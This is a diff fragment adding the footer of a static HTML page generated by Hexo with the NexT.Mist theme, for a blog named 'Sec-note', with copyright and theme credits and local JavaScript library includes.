+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sec-note</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
